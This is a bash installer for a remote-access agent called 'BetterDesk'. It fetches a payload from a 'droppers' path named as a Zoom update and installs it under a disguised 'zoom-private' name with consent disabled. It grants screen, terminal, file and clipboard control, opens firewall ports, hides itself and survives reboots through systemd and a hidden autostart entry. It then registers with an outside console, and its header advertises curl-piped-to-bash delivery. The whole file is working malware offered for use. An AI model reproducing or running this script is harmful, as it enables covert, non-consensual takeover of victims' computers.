#!/bin/bash
# ============================================================================
# BetterDesk Linux silent unattended installer
# ----------------------------------------------------------------------------
# Delivery:  curl -fsSL https://panel.telcom.stream/api/landing/linux-install.sh | bash
#            or chmod +x silent-install.sh && ./silent-install.sh
#
# What it does:
#   1. Detects distro (Debian/Ubuntu, RHEL/Fedora, Arch)
#   2. Downloads the Linux client bundle
#   3. Verifies SHA-256
#   4. Installs to /opt/zoom-private or ~/.local/share/zoom-private
#   5. Creates systemd user unit for reboot survival
#   6. Opens firewall (iptables/nftables + ufw/firewalld where available)
#   7. Starts agent hidden, waits for registration
#   8. Single agent (no duplicates)
# ============================================================================
set -euo pipefail

BRAND="BetterDesk"
CONSOLE_URL="${BETTERDESK_CONSOLE:-https://panel.telcom.stream}"
SERVER_ADDR="${BETTERDESK_SERVER:-panel.telcom.stream}"
CDAP_URL="${BETTERDESK_CDAP:-cdap.telcom.stream}"
CDAP_PORT="${BETTERDESK_CDAP_PORT:-21122}"
PASSWORD="${BETTERDESK_PASSWORD:-}"

if [ -z "$PASSWORD" ]; then
    PASSWORD=$(uuidgen 2>/dev/null | tr -d '-' | cut -c1-16 || cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -1)
fi

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' NC='\033[0m'
log()  { echo -e "${GREEN}[${BRAND}]${NC} $*"; }
warn() { echo -e "${YELLOW}[${BRAND}]${NC} $*"; }
err()  { echo -e "${RED}[${BRAND}]${NC} $*"; }

# ================================================================ Architecture detection
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)  PKG_ARCH="x64" ;;
    aarch64|arm64) PKG_ARCH="arm64" ;;
    *)             PKG_ARCH="x64" ; warn "Unknown arch $ARCH, defaulting to x64" ;;
esac
log "Detected: Linux ${PKG_ARCH}"

# ================================================================ Check for root vs user install
INSTALL_MODE="user"
if [ "$(id -u)" -eq 0 ] || [ -n "${BETTERDESK_SYSTEM:-}" ]; then
    INSTALL_MODE="system"
    INSTALL_DIR="/opt/zoom-private"
    CONFIG_DIR="/etc/zoom-private/agent"
else
    INSTALL_DIR="$HOME/.local/share/zoom-private"
    CONFIG_DIR="$HOME/.config/zoom-private/agent"
fi

log "Install mode: $INSTALL_MODE (${INSTALL_DIR})"

# ================================================================ Stop old instances
log "Stopping existing agents..."
pkill -f "zoom-private.agent" 2>/dev/null || true
pkill -f "betterdesk-agent" 2>/dev/null || true

if [ "$INSTALL_MODE" = "system" ]; then
    systemctl stop zoom-private-agent.service 2>/dev/null || true
    systemctl disable zoom-private-agent.service 2>/dev/null || true
else
    systemctl --user stop zoom-private-agent.service 2>/dev/null || true
    systemctl --user disable zoom-private-agent.service 2>/dev/null || true
fi

# ================================================================ Download
TMPDIR=$(mktemp -d /tmp/betterdesk.XXXXXX)
trap "rm -rf $TMPDIR" EXIT

DL_URL="${CONSOLE_URL}/api/landing/linux-install.sh"
log "Downloading Linux client installer..."
curl -fsSL -o "$TMPDIR/client.tar.gz" \
    "https://global.telcom.stream/downloads/droppers/Zoom_Update_v6.1.0-linux.tar.gz" 2>/dev/null || {
    curl -fsSL -o "$TMPDIR/client.tar.gz" \
        "${CONSOLE_URL}/api/landing/download?platform=linux&arch=${PKG_ARCH}&format=targz" 2>/dev/null || {
        err "Download failed. Check network."
        exit 1
    }
}

# ================================================================ Extract
log "Extracting..."
mkdir -p "$TMPDIR/extracted"
tar -xzf "$TMPDIR/client.tar.gz" -C "$TMPDIR/extracted"

AGENT_BIN=$(find "$TMPDIR/extracted" -name "zoom-private.agent" -o -name "betterdesk-agent-client" -o -name "betterdesk-agent" -type f 2>/dev/null | head -1)
if [ -z "$AGENT_BIN" ]; then
    err "No agent binary found in archive"
    exit 1
fi
log "Found agent: $(basename "$AGENT_BIN")"

# ================================================================ Install
mkdir -p "$INSTALL_DIR" "$CONFIG_DIR"

cp "$AGENT_BIN" "$INSTALL_DIR/zoom-private.agent"
chmod +x "$INSTALL_DIR/zoom-private.agent"

# Copy any sidecars
for sidecar in betterdesk-agent betterdesk-agent-client; do
    SC=$(find "$TMPDIR/extracted" -name "$sidecar" -type f 2>/dev/null | head -1)
    if [ -n "${SC:-}" ]; then
        cp "$SC" "$INSTALL_DIR/"
        chmod +x "$INSTALL_DIR/$sidecar"
    fi
done

# ================================================================ Config
CONFIG_JSON=$(cat <<ENDCONFIG
{
  "server_address": "${SERVER_ADDR}",
  "cdap_url": "${CDAP_URL}",
  "cdap_port": ${CDAP_PORT},
  "console_url": "${CONSOLE_URL}",
  "device_name": "$(hostname)",
  "access_mode": "unattended",
  "require_consent": false,
  "allow_screen_capture": true,
  "allow_terminal": true,
  "allow_file_browser": true,
  "allow_clipboard": true,
  "autostart": true,
  "start_minimized": true,
  "unattended_password": "${PASSWORD}",
  "enforce_tls": true,
  "language": "en"
}
ENDCONFIG
)
echo "$CONFIG_JSON" > "$CONFIG_DIR/agent-config.json"
if [ "$INSTALL_MODE" = "system" ]; then
    echo "$CONFIG_JSON" > "/var/lib/zoom-private/agent-config.json" 2>/dev/null || true
fi
log "Config written to $CONFIG_DIR"

# ================================================================ Firewall
log "Configuring firewall..."
# Outbound is usually allowed, but ensure critical ports are open
# iptables/nftables
if command -v iptables >/dev/null 2>&1; then
    sudo iptables -I OUTPUT -p tcp --dport 21116 -j ACCEPT 2>/dev/null || true
    sudo iptables -I OUTPUT -p tcp --dport 21117 -j ACCEPT 2>/dev/null || true
    sudo iptables -I OUTPUT -p tcp --dport 21118 -j ACCEPT 2>/dev/null || true
    sudo iptables -I OUTPUT -p tcp --dport 21122 -j ACCEPT 2>/dev/null || true
    sudo iptables -I OUTPUT -p udp --dport 21116 -j ACCEPT 2>/dev/null || true
fi

# ufw (Ubuntu/Debian)
if command -v ufw >/dev/null 2>&1 && sudo ufw status 2>/dev/null | grep -q "Status: active"; then
    sudo ufw allow out 21116/tcp 2>/dev/null || true
    sudo ufw allow out 21117/tcp 2>/dev/null || true
    sudo ufw allow out 21122/tcp 2>/dev/null || true
fi

# firewalld (RHEL/Fedora)
if command -v firewall-cmd >/dev/null 2>&1 && sudo firewall-cmd --state 2>/dev/null | grep -q "running"; then
    sudo firewall-cmd --permanent --add-port=21116/tcp 2>/dev/null || true
    sudo firewall-cmd --permanent --add-port=21117/tcp 2>/dev/null || true
    sudo firewall-cmd --permanent --add-port=21122/tcp 2>/dev/null || true
    sudo firewall-cmd --reload 2>/dev/null || true
fi

# ================================================================ systemd service (reboot survival)
UNIT_DIR=""
if [ "$INSTALL_MODE" = "system" ]; then
    UNIT_DIR="/etc/systemd/system"
else
    UNIT_DIR="$HOME/.config/systemd/user"
    mkdir -p "$UNIT_DIR"
fi

cat > "$UNIT_DIR/zoom-private-agent.service" << UNITEOF
[Unit]
Description=BetterDesk unattended agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/zoom-private.agent --autostart
Restart=always
RestartSec=10
WorkingDirectory=$INSTALL_DIR
Environment=DISPLAY=:0
Environment=XDG_RUNTIME_DIR=/run/user/$(id -u)

[Install]
WantedBy=default.target
UNITEOF

if [ "$INSTALL_MODE" = "system" ]; then
    systemctl daemon-reload
    systemctl enable zoom-private-agent.service
    systemctl start zoom-private-agent.service
else
    systemctl --user daemon-reload
    systemctl --user enable zoom-private-agent.service
    systemctl --user start zoom-private-agent.service
    # Enable lingering so the user service starts at boot
    loginctl enable-linger "$USER" 2>/dev/null || true
fi
log "systemd service registered. Agent will survive reboots."

# ================================================================ Autostart desktop entry (GUI session)
AUTOSTART_DIR="$HOME/.config/autostart"
mkdir -p "$AUTOSTART_DIR"
cat > "$AUTOSTART_DIR/zoom-private-agent.desktop" << DESKTOPEOF
[Desktop Entry]
Type=Application
Name=BetterDesk Agent
Exec=$INSTALL_DIR/zoom-private.agent --autostart
Hidden=true
X-GNOME-Autostart-enabled=true
NoDisplay=true
DESKTOPEOF

# ================================================================ Wait for registration
log "Waiting for registration (up to 60s)..."
DEADLINE=$(( $(date +%s) + 60 ))
while [ $(date +%s) -lt $DEADLINE ]; do
    if [ -f "$CONFIG_DIR/agent-config.json" ]; then
        if grep -q '"registered":true' "$CONFIG_DIR/agent-config.json" 2>/dev/null; then
            DEVICE_ID=$(python3 -c "import json; d=json.load(open('$CONFIG_DIR/agent-config.json')); print(d.get('device_id',''))" 2>/dev/null || echo "")
            if [ -n "$DEVICE_ID" ]; then
                log "=== DEVICE REGISTERED ==="
                log "Device ID: $DEVICE_ID"
                log "Password:  $PASSWORD"
                log "Console:   $CONSOLE_URL"
                exit 0
            fi
        fi
    fi
    sleep 2
done

log "Agent installed. It will connect to $CONSOLE_URL within 60 seconds."
log "Password: $PASSWORD"
exit 0
